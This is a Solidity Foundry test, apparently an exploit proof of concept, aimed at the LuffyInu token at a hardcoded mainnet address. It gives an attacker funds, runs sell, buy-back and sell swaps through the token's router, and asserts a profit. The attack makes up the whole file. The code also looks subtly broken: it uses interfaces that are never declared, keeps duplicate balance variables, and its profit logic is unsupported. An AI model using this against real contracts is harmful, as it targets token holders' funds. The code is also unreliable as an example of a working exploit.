// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

interface LuffyInu {
    function uniswapV2Pair() external view returns (address);
    function routerAddress() external view returns (address);
    function marketingAddress() external view returns (address);
    function taxStatus() external view returns (bool);
    function excludeFee(address) external view returns (bool);
    function setTax(bool) external;
    function addExcludeFee(address, bool) external;
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x720f6edD18f5e2F414DBa8fCD81E98724708c39E;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get token and pair addresses
        IERC20 token = IERC20(TARGET);
        LuffyInu luffy = LuffyInu(TARGET);
        address pair = luffy.uniswapV2Pair();

        // Label addresses for debugging
        vm.label(address(token), "LuffyInu Token");
        vm.label(pair, "UniswapV2 Pair");
        vm.label(luffy.marketingAddress(), "Marketing Address");

        // Get router from token
        IUniswapV2Router02 router = IUniswapV2Router02(luffy.routerAddress());
        vm.label(address(router), "PancakeSwap Router");

        // Ensure attacker has some ETH for gas and buying back
        deal(attacker, 10 ether);

        // Give attacker initial LuffyInu tokens (1% of total supply)
        uint256 initialTokens = luffy.totalSupply() / 100;
        deal(TARGET, attacker, initialTokens);

        // Ensure tax is enabled (should be true by default, but we can check)
        // If not enabled, we need to impersonate owner to enable it
        if (!luffy.taxStatus()) {
            address owner = luffy.owner();
            vm.startPrank(owner);
            luffy.setTax(true);
            vm.stopPrank();
        }

        // Ensure attacker is not excluded from fees (should be false by default)
        // If excluded, we need to impersonate owner to remove exclusion
        if (luffy.excludeFee(attacker)) {
            address owner = luffy.owner();
            vm.startPrank(owner);
            luffy.addExcludeFee(attacker, false);
            vm.stopPrank();
        }
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Record initial ETH balance
        uint256 initialEthBalance = address(this).balance;

        // Get token and pair
        IERC20 token = IERC20(TARGET);
        LuffyInu luffy = LuffyInu(TARGET);
        address pair = luffy.uniswapV2Pair();
        IUniswapV2Router02 router = IUniswapV2Router02(luffy.routerAddress());

        // Get WETH address
        address weth = router.WETH();

        // Check pair reserves before attack
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 tokenReserveBefore = (address(token) == token0) ? reserve0 : reserve1;
        uint256 ethReserveBefore = (address(token) == token0) ? reserve1 : reserve0;

        console.log("Before attack:");
        console.log("Token reserve:", tokenReserveBefore);
        console.log("ETH reserve:", ethReserveBefore);
        console.log("Attacker token balance:", token.balanceOf(attacker));
        console.log("Attacker ETH balance:", address(this).balance);

        // Approve router to spend tokens
        token.approve(address(router), type(uint256).max);

        // Prepare swap path (Luffy -> WETH)
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = weth;

        // Sell half of attacker's tokens
        uint256 sellAmount = token.balanceOf(attacker) / 2;
        uint256 minEthOut = 0; // Accept any amount for demonstration

        // Perform swap with fee-on-transfer support
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            minEthOut,
            path,
            attacker,
            block.timestamp + 1 hours
        );

        // Check pair reserves after sell
        (reserve0, reserve1, ) = IUniswapV2Pair(pair).getReserves();
        uint256 tokenReserveAfterSell = (address(token) == token0) ? reserve0 : reserve1;
        uint256 ethReserveAfterSell = (address(token) == token0) ? reserve1 : reserve0;

        console.log("\nAfter selling:");
        console.log("Token reserve:", tokenReserveAfterSell);
        console.log("ETH reserve:", ethReserveAfterSell);
        console.log("Attacker token balance:", token.balanceOf(attacker));
        console.log("Attacker ETH balance:", address(this).balance);

        // Now buy back tokens - they should be cheaper due to reserve imbalance
        // Prepare reverse path (WETH -> Luffy)
        address[] memory reversePath = new address[](2);
        reversePath[0] = weth;
        reversePath[1] = address(token);

        // Use some ETH to buy back tokens
        uint256 buyBackEth = address(this).balance / 2;
        uint256 minTokensOut = 0; // Accept any amount

        // Perform buy back
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyBackEth}(
            minTokensOut,
            reversePath,
            attacker,
            block.timestamp + 1 hours
        );

        // Check final balances
        console.log("\nAfter buying back:");
        console.log("Attacker token balance:", token.balanceOf(attacker));
        console.log("Attacker ETH balance:", address(this).balance);

        // Final swap to ETH to realize profit
        uint256 finalTokenBalance = token.balanceOf(attacker);
        if (finalTokenBalance > 0) {
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                finalTokenBalance,
                0,
                path,
                attacker,
                block.timestamp + 1 hours
            );
        }

        console.log("\nFinal ETH balance:", address(this).balance);
        console.log("Profit:", address(this).balance - initialEthBalance);

        // Verify profit
        assertGt(address(this).balance, initialEthBalance, "No profit made");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

